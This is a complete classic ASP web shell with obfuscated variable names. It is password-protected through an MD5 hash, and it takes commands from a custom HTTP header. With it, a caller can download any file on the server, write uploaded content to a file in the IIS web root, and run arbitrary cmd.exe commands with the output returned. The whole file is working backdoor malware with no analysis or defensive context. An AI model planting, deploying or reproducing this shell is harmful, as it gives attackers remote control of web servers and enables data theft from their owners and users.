<%
Qkzn = Request.ServerVariables("HTTP_X_OPTIV")
jMEJ = "e86a181106d09b52d09e16356ec30618"
uEZq = request("pass")
Set EXEn = CreateObject("System.Text.UTF8Encoding")
Set PpJVt = CreateObject("System.Security.Cryptography.MD5CryptoServiceProvider")
AjEuXK = EXEn.GetBytes_4(uEZq)
AjEuXK = PpJVt.ComputeHash_2((AjEuXK))
sikZ = ""
For Vhxy = 1 To LenB(AjEuXK)
  sikZ = sikZ & LCase(Right("0" & Hex(AscB(MidB(AjEuXK, Vhxy, 1))), 2))
Next
if sikZ <> jMEJ Then
  response.end
end if
On Error Resume Next
if Left(Qkzn, 4) = "get " Then
  
  uvz = Split(Qkzn, " ")(1)
  
  Set iVWAs = Server.CreateObject("Scripting.FileSystemObject")
  If iVWAs.FileExists(uvz) Then
    Set ENAhRg = iVWAs.GetFile(uvz)
    Response.Clear 
    Response.AddHeader "Content-Disposition", "attachment; filename=" & ENAhRg.Name
    Response.AddHeader "Content-Length", ENAhRg.Size
    Response.ContentType = "application/octet-stream"
    Set Ytvl = Server.CreateObject("ADODB.Stream")
    Ytvl.Type = 1
    Ytvl.Open
    Ytvl.LoadFromFile(uvz)
    Response.BinaryWrite(Ytvl.Read)
    Ytvl.Close
    If Err.Number <> 0 Then
      Response.Clear
      Response.Status = 500
      Response.Write Err.Description
      Response.End
    End If
    Set Ytvl = Nothing
    Set ENAhRg = Nothing
  Else 'iVWAs.FileExists(uvz)
    Response.Clear
    Response.Status = 404
    Response.Write("File not found.")
  End If
  Set iVWAs = Nothing
  response.end
elseif Left(Qkzn, 4) = "put " Then
  uvz = Split(Qkzn, " ")
  cYS = uvz(1)
  set iVWAs=Server.CreateObject("Scripting.FileSystemObject")
  If ubound(uvz) > 1 Then
    cYS = uvz(2)
  Else
    cYS=iVWAs.getfilename(cYS)
  End If
  response.write cYS 
  set HUcJ = CreateObject("Msxml2.DOMDocument").CreateElement("aux")
  HUcJ.DataType = "bin.base64Var"
  HUcJ.Text = Request("f")
  set ZHBDns = CreateObject("ADODB.Stream")
  ZHBDns.Type = 1 ' adTypeBinary
  ZHBDns.Open
  ZHBDns.Write HUcJ.NodeTypedValue
  ZHBDns.Position = 0
  
  ZHBDns.CharSet = "utf-8"
  set ENAhRg=iVWAs.CreateTextFile("C:\inetpub\wwwroot\nice.php",true)
  ENAhRg.write ZHBDns.ReadText
  response.end
end if
Set dtKjt = CreateObject("WScript.Shell").exec("cmd /c " & Qkzn)
Response.Write(dtKjt.StdOut.ReadAll)
%>
